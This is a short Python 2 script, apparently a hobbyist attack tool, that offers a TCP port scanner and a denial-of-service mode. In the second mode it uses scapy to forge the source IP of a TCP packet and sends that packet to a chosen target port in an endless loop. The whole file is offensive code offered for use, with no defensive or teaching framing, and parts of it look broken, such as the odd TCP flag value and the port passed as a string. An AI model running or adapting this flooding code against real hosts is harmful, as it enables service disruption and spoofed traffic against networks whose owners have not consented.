#! /usr/bin/env python

import sys
from scapy import *
import socket

#port check function
def port_check(addr, port):

	
	#try to connect to port specified
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect((addr,port))
		
		#if successfully return 1
		return 1

	#if there is a socket error or timeout 
	except socket.error, (message, value): 

		return 0

	except socket.timeout:

		return 0



#beginning of main function
mode = raw_input("Port Scan or IP spoof DOS attack (1/2): ")

#check mode
if int(mode) not in [1,2]:

	#print incorrect mode chosen.
	print "incorrect mode selected, please choose 1 for port scan or 2 for DOS IP spoofing attack"

#if mode = 1 then run port scan
if int(mode) == 1:

	#input host name/ and port range to scan
	host = raw_input("Enter Host name: ")
	start = raw_input("Enter starting port: ")
	end = raw_input("Enter Ending port: ")

	#run through all ports.
	for i in range(int(start), int(end)):

		check = port_check(host, i)

		if check == 1:
				
			#print port that works
			print str(i),

#if DOS ip spoofing attack chosen
elif int(mode) == 2:

	#get IP info to create packets.
	srIP = raw_input("Enter Source IP: ")
	dIP  = raw_input("Enter Dest. IP: ")

	#enter port to attack
	dPort = raw_input("Enter port to attack: ")

	#create IP/TCP packets
	packet1 = IP(dst = dIP, src = srIP)/TCP(sport=5871, dport=dPort, seq = 17843, flags='5')
	
	#start DOS attack
	while 1: 
		
		#send packets non stop.
		send(packet1)


